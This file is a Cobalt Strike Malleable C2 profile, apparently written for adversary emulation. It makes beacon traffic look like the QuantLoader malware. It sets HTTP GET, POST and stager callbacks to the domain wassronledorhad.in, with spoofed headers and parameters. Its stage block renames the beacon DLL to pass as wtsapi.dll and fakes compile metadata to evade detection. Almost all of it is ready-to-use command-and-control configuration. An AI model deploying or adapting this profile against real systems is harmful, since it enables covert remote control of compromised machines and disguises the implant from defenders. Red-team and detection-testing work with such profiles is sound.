#quantloader
#taken from - https://blog.malwarebytes.com/threat-analysis/2018/03/an-in-depth-malware-analysis-of-quantloader/ & https://www.hybrid-analysis.com/sample/2b53466eebd2c65f81004c567df9025ce68017241e421abcf33799bd3e827900?environmentId=120
#xx0hcd


set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36";
set dns_idle "8.8.8.8";
set maxdns    "235";


http-get {

    set uri "/q2/index.php";
    
    client {

        header "Host" "wassronledorhad.in";
	
        
        metadata {
            netbios;
            parameter "id";


        }

	parameter "c" "2";
	parameter "mk" "75490e";
	parameter "il" "H";
	parameter "vr" "1.73";
	parameter "bt" "64";

    }

    server {
        header "Server" "nginx";
	header "Content-Type" "text/html; charset=windows-1251";
	header "Connection" "keep-alive";
	header "Vary" "Accept-Encoding";
        

        output {
            netbios;
	    prepend "               ";
	    prepend "               ";
	    prepend "0";
            print;
        }
    }
}

http-post {
    
    set uri "/Q2/index.php";
    set verb "GET";

    client {
       
	header "Host" "wassronledorhad.in";
        
        output {
            netbios;
            parameter "id";

        }

	parameter "c" "3";
             
        id {
            netbios;
	    parameter "mk";


        }
	
	parameter "il" "H";
	parameter "vr" "1.73";
	parameter "bt" "64";

    }

    server {

	header "Server" "nginx";
	header "Content-Type" "text/html; charset=windows-1251";
	header "Connection" "keep-alive";
	header "Vary" "Accept-Encoding";
        

        output {
            netbios;
	    prepend "               ";
	    prepend "               ";
	    prepend "0";
            print;
        }
    }
}

http-stager {

	set uri_x86 "/q2/Index.php";
	set uri_x64 "/Q2/Index.php";

    client {
	header "Host" "wassronledorhad.in";

    parameter "id" "90942486";
    parameter "c" "1";
    parameter "mk" "75490e";
    parameter "il" "H";
    parameter "vr" "1.73";
    parameter "bt" "64";
    }

    server {
	header "Server" "nginx";
	header "Content-Type" "text/html; charset=windows-1251";
	header "Connection" "keep-alive";
	header "Vary" "Accept-Encoding";

	output {
	    prepend "               ";
	    prepend "               ";
	    prepend "0";
            print;
	}
    
    }


}

stage {
	set compile_time "11 Nov 2010 23:29:33";
	set image_size_x86 "460800";
	set image_size_x64 "460800";
	transform-x86 {
		strrep "beacon.dll" "wtsapi.dll";
	}

	transform-x64 {
		strrep "beacon.x64.dll" "wtsapi32.dll";
	}	



}
